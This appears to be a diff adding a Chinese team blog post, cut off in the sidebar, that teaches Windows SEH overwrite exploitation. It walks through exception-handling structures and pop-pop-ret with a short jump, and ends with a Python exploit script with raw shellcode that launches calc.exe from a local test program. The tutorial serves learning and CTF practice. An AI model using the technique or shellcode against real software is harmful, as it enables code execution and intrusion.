@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>WindowsPwn--SEH | Asuri Team</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="各种原因下开始接触 Windows Pwn 了。之前Linux下的那套思想还是能继续用，不过 Windows 平台下似乎有更多有趣的特性可以利用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WindowsPwn--SEH">
+<meta property="og:url" content="http://asuri.org/2018/01/16/WindowsPwn-SEH/index.html">
+<meta property="og:site_name" content="Asuri Team">
+<meta property="og:description" content="各种原因下开始接触 Windows Pwn 了。之前Linux下的那套思想还是能继续用，不过 Windows 平台下似乎有更多有趣的特性可以利用">
+<meta property="og:locale">
+<meta property="og:image" content="http://showlinkroom.me/2018/01/16/WindowsPwn-SEH/seh01.png">
+<meta property="og:image" content="http://showlinkroom.me/2018/01/16/WindowsPwn-SEH/seh02.png">
+<meta property="og:image" content="http://showlinkroom.me/2018/01/16/WindowsPwn-SEH/seh05.png">
+<meta property="og:image" content="http://showlinkroom.me/2018/01/16/WindowsPwn-SEH/seh05.png">
+<meta property="og:image" content="http://showlinkroom.me/2018/01/16/WindowsPwn-SEH/seh06.png">
+<meta property="og:image" content="http://showlinkroom.me/2018/01/16/WindowsPwn-SEH/seh03.png">
+<meta property="og:image" content="http://showlinkroom.me/2018/01/16/WindowsPwn-SEH/seh04.png">
+<meta property="og:image" content="http://showlinkroom.me/2018/01/16/WindowsPwn-SEH/seh07.png">
+<meta property="article:published_time" content="2018-01-16T13:23:49.000Z">
+<meta property="article:modified_time" content="2023-04-07T12:29:53.466Z">
+<meta property="article:author" content="All Members">
+<meta property="article:tag" content="windows">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://showlinkroom.me/2018/01/16/WindowsPwn-SEH/seh01.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Asuri Team" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <div id="container">
+    
+
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Asuri Team</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/members">Members</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://asuri.org"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-WindowsPwn-SEH" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/01/16/WindowsPwn-SEH/" class="article-date">
+  <time datetime="2018-01-16T13:23:49.000Z" itemprop="datePublished">2018-01-16</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Pwn/">Pwn</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      WindowsPwn--SEH
+    </h1>
+  
+
+
+  <div class="article-author">
+    <img src="https://www.gravatar.com/avatar/f4436263f3150c6b60b87869224e99e3?s=48">
+    <div class="article-author-info">
+      <a href="/author/l1nk" class="article-author-name">l1nk</a>
+      <a target="_blank" rel="noopener" href="http://showlinkroom.me/" class="article-author-site" title="Visit the author's site">[site]</a>
+      <div class="article-author-about" title="想要混入安全圈的菜鸡，只会搞简单的bin">想要混入安全圈的菜鸡，只会搞简单的bin</div>
+    </div>
+  </div>
+
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>各种原因下开始接触 Windows Pwn 了。之前Linux下的那套思想还是能继续用，不过 Windows 平台下似乎有更多有趣的特性可以利用</p>
+<a id="more"></a>
+<h2 id="Windows-下的-SEH"><a href="#Windows-下的-SEH" class="headerlink" title="Windows 下的 SEH "></a>Windows 下的 SEH </h2><h2 id="异常处理那些事"><a href="#异常处理那些事" class="headerlink" title="异常处理那些事"></a>异常处理那些事</h2><p>程序的运行并不总是那么稳健，有时候会因为一些错误抛出异常或者导致崩溃。那么如果我们的逻辑中有应对异常的办法，那么就能够保证程序的健壮性。 Windows 下就提供了一种用来处理异常的机制 — <strong>Structured Exception Handling</strong></p>
+<h3 id="异常处理的结构"><a href="#异常处理的结构" class="headerlink" title="异常处理的结构"></a>异常处理的结构</h3><p>在微软支持的 C / C++ 编译器优化中，支持如下的代码结构:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">__try&#123;</span><br><span class="line">    guarded body of code</span><br><span class="line">&#125;</span><br><span class="line">__except(Condition)&#123;</span><br><span class="line">    identifies an exception</span><br><span class="line">&#125;</span><br><span class="line">__finally&#123;</span><br><span class="line">    identifies a termmination handle</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><em>和别的语言差不多，都是try中放可能会出错的代码，except中存放抛出指定异常的时候的处理代码，finally中则是无论异常是否触发都会进行的最后的收尾工作</em></p>
+<h4 id="异常抛出后的流程"><a href="#异常抛出后的流程" class="headerlink" title="异常抛出后的流程"></a>异常抛出后的流程</h4><p>当一个异常的事件被抛出的时候，系统会首先调用函数<code>RaiseException</code>来描述当前线程中的异常的基本信息，然后会决定是否要执行当前的程序。根据不同的情况，异常可以分为<strong>可以继续执行的</strong>和<strong>不可以继续执行的</strong>两种类型。当异常发生的时候，程序首先再当前位置停止当前的进程，然后即将控制权<strong>交给系统</strong>。系统首先会保存当前进程的基本信息，然后会尝试去寻找一个<strong>异常句柄(Exception Handling)**来处理异常情况。当前上下文的信息会被存储在一个叫做</strong>CONTEXT<strong>的结构体中，这些信息用于再完成异常处理后继续运行(如果程序还能够继续运行的话）。这些异常的信息都被存储在一个叫做</strong>EXCEPTION_RECORD**的结构体中。当处理完异常之后，根据异常类型决定是终止当前进程或者是继续运行。</p>
+<p><img src="http://showlinkroom.me/2018/01/16/WindowsPwn-SEH/seh01.png"></p>
+<p><code>SEH</code>的位置如下<br><img src="http://showlinkroom.me/2018/01/16/WindowsPwn-SEH/seh02.png"></p>
+<p><em>其中有一部分的内容从微软的官方文档中好像不容易找到，于是从网上搜集来的信息如下</em><br><code>SEH Handler</code>对象存储形式:<br><img src="http://showlinkroom.me/2018/01/16/WindowsPwn-SEH/seh05.png"><br>大致就是如下的结构体</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct SEH Handler&#123;</span><br><span class="line">    PVOID NextSehHandler;</span><br><span class="line">    HANDLERFUNCPTR except_handler_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>第一个变量记录了下一个<code>SEH Handler</code>的位置，<code>except_hander_ptr</code>函数则是记录了当前的异常处理函数的地址。<br>这个<code>SEH Chain</code>就是由这些节点组成的。其中这个节点的末尾的 NextSehHandler 为-1，表示当前节点已经到达尾部，并且该节点上的函数一般都是<code>ExitTread/ExitProcess</code>，用于终止当前的进程（也就是说，如果无法处理这个异常的话，我们就终止该进程，没毛病）。<br>当异常抛出后，系统会对当前的异常程序进行展开，检查当前的 except handle 能否处理当前的异常，如果不行的话就遍历这个<code>SEH Chain</code>，如果找到了可以处理异常的节点后，会重新遍历<code>SEH Chain</code>,不过这一次是直接访问对应的<code>except_handler</code>，并且调用函数进行处理。</p>
+<h4 id="相关结构信息"><a href="#相关结构信息" class="headerlink" title="相关结构信息"></a>相关结构信息</h4><p><code>GS_ExceptionPointers</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_POINTERS</span> &#123;</span></span><br><span class="line">  PEXCEPTION_RECORD ExceptionRecord;</span><br><span class="line">  PCONTEXT          ContextRecord;</span><br><span class="line">&#125; EXCEPTION_POINTERS, *PEXCEPTION_POINTERS;</span><br><span class="line">````</span><br><span class="line">变量含义如下:</span><br></pre></td></tr></table></figure>
+<p>+——————————–+————————————————————————–+<br>|        ExceptionRecord         |  指向ExceptionRecord的指针，里面记载了一个独立于机器的异常行为               |<br>+——————————–+————————————————————————–+<br>|        ContextRecord           |  指向记录了异常上下文结构体的指针                                           |<br>+——————————–+————————————————————————–+</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#96;RaiseException&#96;</span><br><span class="line">&#96;&#96;&#96;C</span><br><span class="line">void WINAPI RaiseException(</span><br><span class="line">  _In_       DWORD     dwExceptionCode,</span><br><span class="line">  _In_       DWORD     dwExceptionFlags,</span><br><span class="line">  _In_       DWORD     nNumberOfArguments,</span><br><span class="line">  _In_ const ULONG_PTR *lpArguments</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<p>变量含义如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+--------------------------------+--------------------------------------------------------------------------+</span><br><span class="line">|        dwExceptionCode         |  表示当前线程的发生异常的原因(例如读写保护地址，数组越界并且能够被检查到等等)   |</span><br><span class="line">+--------------------------------+--------------------------------------------------------------------------+</span><br><span class="line">|        dwExceptionFlags        |  表示当前的异常发生后，能够被执行。                                          |</span><br><span class="line">+--------------------------------+--------------------------------------------------------------------------+</span><br><span class="line">|        nNumberOfArguments      |  lpArguments 数组中的参数个数                                              |</span><br><span class="line">+--------------------------------+--------------------------------------------------------------------------+</span><br><span class="line">|        lpArguments             |  当前参数的数组                                                            |</span><br><span class="line">+--------------------------------+--------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>
+
+<p><code>EXCEPTION_RECORD</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> &#123;</span></span><br><span class="line">  DWORD                    ExceptionCode;</span><br><span class="line">  DWORD                    ExceptionFlags;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span>  *<span class="title">ExceptionRecord</span>;</span></span><br><span class="line">  PVOID                    ExceptionAddress;</span><br><span class="line">  DWORD                    NumberParameters;</span><br><span class="line">  ULONG_PTR                ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];</span><br><span class="line">&#125; EXCEPTION_RECORD, *PEXCEPTION_RECORD;</span><br></pre></td></tr></table></figure>
+<p>变量含义如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">+------------------------------+--------------------------------------------------------------------------+</span><br><span class="line">|        ExceptionCode         |  表示当前线程的发生异常的原因(例如读写保护地址，数组越界并且能够被检查到等等)   |</span><br><span class="line">+------------------------------+--------------------------------------------------------------------------+</span><br><span class="line">|        ExceptionFlags        |  表示当前的异常发生后，能够被执行。                                          |</span><br><span class="line">+------------------------------+--------------------------------------------------------------------------+</span><br><span class="line">|        ExceptionRecord       |  指向Exceotion_Record的结构体。当异常嵌套发生的时候，这个异常处理会串成链的形式|</span><br><span class="line">+------------------------------+--------------------------------------------------------------------------+</span><br><span class="line">|        ExceptionAddress      |  异常发生时候的地址                                                        |</span><br><span class="line">+------------------------------+--------------------------------------------------------------------------+</span><br><span class="line">|        NumberParameters      |  和当前异常相关的参数。这些参数定义在 ExceptionInformation 数组中             |</span><br><span class="line">+------------------------------+--------------------------------------------------------------------------+</span><br><span class="line">|        ExceptionInformation  |  用于描述当前异常的擦书。函数 RaiseException 可以指定这个数组的参数            |</span><br><span class="line">+------------------------------+--------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>
+
+<p><code>except_handler</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">except_handler(  </span><br><span class="line">    struct _EXCEPTION_RECORD *ExceptionRecord,  </span><br><span class="line">    <span class="keyword">void</span> * EstablisherFrame,  </span><br><span class="line">    struct _CONTEXT *ContextRecord,  </span><br><span class="line">    <span class="keyword">void</span> * DispatcherContext ) </span><br></pre></td></tr></table></figure>
+<p>函数作用：<br>该函数即为SEH这个流程中会调用的异常处理函数。当异常发生的时候，这个函数就会接住抛出的异常并且对其进行处理。</p>
+<p><strong>关键：</strong><br>上述大部分变量前面有，<strong>关键变量EstablisherFrame</strong>表示的意思是<strong>当前SEH栈的起始位置</strong>，这个地方往往会成为pwn的位置。</p>
+<h4 id="特征代码"><a href="#特征代码" class="headerlink" title="特征代码"></a>特征代码</h4><p>由于SEH是以链表的形式存在的，其链表头部存在于<code>FS:[0]</code>中，我们可以通过检查代码中是否包含这段代码来确定这个SEH的头部在哪(以下是这段代码的操作码)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">64A100000000</span><br></pre></td></tr></table></figure>
+
+<h4 id="调试中的查看方法"><a href="#调试中的查看方法" class="headerlink" title="调试中的查看方法"></a>调试中的查看方法</h4><h5 id="windbg"><a href="#windbg" class="headerlink" title="windbg"></a>windbg</h5><p>使用指令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!exchain</span><br></pre></td></tr></table></figure>
+<p>可以直接展示当前程序中的SEH</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d fs:[0]</span><br></pre></td></tr></table></figure>
+<p>查看当前SEH的起始地址</p>
+<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><p>前面讲了一大堆，其中最关键的对象就是<strong>栈中的 SEH Handle 存储的形式</strong>这点:<br><img src="http://showlinkroom.me/2018/01/16/WindowsPwn-SEH/seh05.png"><br>这里可以看到，如果我们能够知道<strong>哪一个 SEH Handler函数能够处理我们引发的异常，我们就可以通过修改触发对应异常，并且修改对应的函数地址完成eip的劫持</strong>！</p>
+<h3 id="DEP关闭的情况"><a href="#DEP关闭的情况" class="headerlink" title="DEP关闭的情况"></a>DEP关闭的情况</h3><p>此时我们需要知道我们填写的shellcode的地址，并且控制程序流跳转上去。这里给出我们需要的payload的形式:<br><img src="http://showlinkroom.me/2018/01/16/WindowsPwn-SEH/seh06.png"><br>让我们结合上述的的payload来讲一下这个思路好了：</p>
+<h4 id="让eip跳转到esp上！"><a href="#让eip跳转到esp上！" class="headerlink" title="让eip跳转到esp上！"></a>让eip跳转到esp上！</h4><p>在进行异常函数调用的时候，<strong>esp的位置发生了变化</strong>。然而根据上面的函数可以知道，每一个<code>SEH Handler</code>中都会存储变量<code>EstablisherFrame</code>，这个变量就是我们的<code>SEH Chain</code>的起始地址，也就是一个<strong>我们可以控制的esp地址</strong>，那么此时我们可以将这个<code>except_handler</code>的地址修改成如下的ROP的地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop --&gt; 弹出第四个参数</span><br><span class="line">pop --&gt; 弹出第三个参数</span><br><span class="line">ret --&gt; 跳转至EstablisherFrame</span><br></pre></td></tr></table></figure>
+<p>此时我们就能够跳转到EstablisherFrame上，也就是<code>SEH Chain</code>的开头（上图的Jmp处）了！</p>
+<h4 id="让eip跳转到shellcode上！"><a href="#让eip跳转到shellcode上！" class="headerlink" title="让eip跳转到shellcode上！"></a>让eip跳转到shellcode上！</h4><p>然而此时的程序如之前的payload，<code>eip</code>当前的位置后4个字节就又是<code>pop pop ret</code>的地址，这样下去的话并不能跳转到我们的shellcode上，于是我们将这个位置填写成一个<strong>向后跳转四个字节</strong>的代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp 0x6 ;&quot;\xeb\x04&quot; 不要忘记自己的两个字节也要跳过去</span><br></pre></td></tr></table></figure>
+<p>跳转后，就正好落到我们的shellcode上了！</p>
+<h2 id="实例-触发fread的SEH"><a href="#实例-触发fread的SEH" class="headerlink" title="实例:触发fread的SEH"></a>实例:触发fread的SEH</h2><p>这里以一个实际例子来说明SEH的触发。<br>函数的大致逻辑如下:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">File = _fopen(argv[<span class="number">1</span>], <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"><span class="keyword">char</span> msg[<span class="number">32</span>];</span><br><span class="line"><span class="built_in">memset</span>(msg, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">_fseek(File, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">len = _ftell(File);</span><br><span class="line">_fseek(v5, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">int</span> num = fread(msg, <span class="number">1</span>, len, File);</span><br><span class="line"><span class="keyword">if</span>(num &gt;= <span class="number">0x20</span>)&#123;</span><br><span class="line">    __report_rangecheckfailure();</span><br><span class="line">    __debugbreak();</span><br><span class="line">    JUMPOUT(*(_DWORD *)__security_check_cookie);</span><br><span class="line">&#125;</span><br><span class="line">msg[num] = <span class="number">0</span>;</span><br><span class="line">_fclose(File);</span><br><span class="line">_printf(<span class="string">&quot;%s\n&quot;</span>, msg);</span><br><span class="line">result = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
+<p>程序本身逻辑很简单，接收一个传入的参数表示当前读入程序的文件，然后通过检测文件本身的长度，将文件内容读入缓冲区中并且输出到屏幕上。由于打开了<code>GS</code>，所以会出现函数<code>__report_rangecheckfailure()</code>这类内容。</p>
+<h3 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h3><p>这个题目看起来就是一个简单的栈溢出，但是由于有<code>GS</code>，所以如果我们只是单纯的输入过长的内容，会导致变量<strong>len</strong>的长度<strong>高于0x20，引发__report_rangecheckfailure</strong>。这个函数我上网找到的资料比较少，大致就是<strong>通过检测读入到栈中数据的长度和预定义的数据长度比较，从而检测栈溢出</strong>。于是如果我们像正常程序一样处理，此时程序逻辑就会如下:<br><img src="http://showlinkroom.me/2018/01/16/WindowsPwn-SEH/seh03.png"></p>
+<ul>
+<li>int 29h 为 win8新加入的特性，可以以最快的方式结束当前进程</li>
+<li>这段逻辑于 main 函数中的 SEH 特性无关</li>
+</ul>
+<p>从上述逻辑中可以看到，这个时候原先处于main函数中的 SEH 已经不再参与到整个程序流程中了(可能只是我没有观察到?不过至少是无法利用 main 函数中的 SEH 了)。</p>
+<p>这样看来，我们就没有办法触发当前main函数中的异常了。。。。吗？</p>
+<h3 id="触发异常的方法"><a href="#触发异常的方法" class="headerlink" title="触发异常的方法"></a>触发异常的方法</h3><p>这个时候要回到观察我们的<code>_fread</code>函数。函数的关键逻辑如下:<br><img src="http://showlinkroom.me/2018/01/16/WindowsPwn-SEH/seh04.png"><br>fread函数中的核心逻辑有一段<code>memcpy</code>的逻辑，这个逻辑只是简单的调用<code>rep</code>，没有进行长度限制之类。于是在这个地方就可能发生<strong>越界读写</strong>。我们这边正是利用了这个思路，<strong>将数据写至栈底以下，触发页保护从而引起异常</strong>。</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>由于这个是本地测试的题目，所以我们倒是不用考虑地址泄露啥的，直接用调试器计算出来就好。首先通过peda中的工具<code>pattern</code>算出当前距离SEH handler 的距离为88，然后根据此编写shellcode的生成程序:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#   -*- coding:utf-8    -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">u32</span>(<span class="params">num</span>):</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;I&quot;</span>, num)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b&quot;</span> </span><br><span class="line">shellcode += <span class="string">b&quot;\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7&quot;</span></span><br><span class="line">shellcode +=<span class="string">b&quot;\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf&quot;</span></span><br><span class="line">shellcode +=<span class="string">b&quot;\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c&quot;</span></span><br><span class="line">shellcode +=<span class="string">b&quot;\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01&quot;</span></span><br><span class="line">shellcode +=<span class="string">b&quot;\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31&quot;</span></span><br><span class="line">shellcode +=<span class="string">b&quot;\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d&quot;</span></span><br><span class="line">shellcode +=<span class="string">b&quot;\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66&quot;</span></span><br><span class="line">shellcode +=<span class="string">b&quot;\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0&quot;</span></span><br><span class="line">shellcode +=<span class="string">b&quot;\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f&quot;</span></span><br><span class="line">shellcode +=<span class="string">b&quot;\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00&quot;</span></span><br><span class="line">shellcode +=<span class="string">b&quot;\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5&quot;</span></span><br><span class="line">shellcode +=<span class="string">b&quot;\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a&quot;</span></span><br><span class="line">shellcode +=<span class="string">b&quot;\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53&quot;</span></span><br><span class="line">shellcode +=<span class="string">b&quot;\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span></span><br><span class="line"></span><br><span class="line">page_offset = <span class="number">0xdb0000</span></span><br><span class="line">pop_pop_ret = u32(<span class="number">0x1931</span> + page_offset)</span><br><span class="line">jmp_code = <span class="string">b&#x27;\x90\x90\xeb\x04&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    fd = <span class="built_in">open</span>(<span class="string">&quot;step2.txt&quot;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    poc = <span class="string">b&quot;a&quot;</span> * <span class="number">84</span> + jmp_code + pop_pop_ret + shellcode + <span class="string">b&quot;a&quot;</span>*<span class="number">3000</span></span><br><span class="line">    fd.write(poc)</span><br><span class="line">    fd.close()</span><br></pre></td></tr></table></figure>
+<p>给个弹出来的计算器一个特写~<br><img src="http://showlinkroom.me/2018/01/16/WindowsPwn-SEH/seh07.png"></p>
+<p>参考文章<br><a target="_blank" rel="noopener" href="https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/">https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/</a><br><a target="_blank" rel="noopener" href="https://www.securitysift.com/windows-exploit-development-part-6-seh-exploits/">https://www.securitysift.com/windows-exploit-development-part-6-seh-exploits/</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://asuri.org/2018/01/16/WindowsPwn-SEH/" data-id="clg6iymp3000gguot4s3x2oul" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/windows/" rel="tag">windows</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/05/12/xinetd-kafel/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          xinetd-kafel - 一个更安全的xinetd服务
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/01/16/pwn%E4%B9%8BBROP/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">pwn之BROP</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+        <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/">Develop</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Devops/">Devops</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/">Pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Reverse/">Reverse</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web-%E5%AE%89%E5%85%A8/">Web 安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Writeup/">Writeup</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%8D%93%E5%AE%89%E5%85%A8/">安卓安全</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
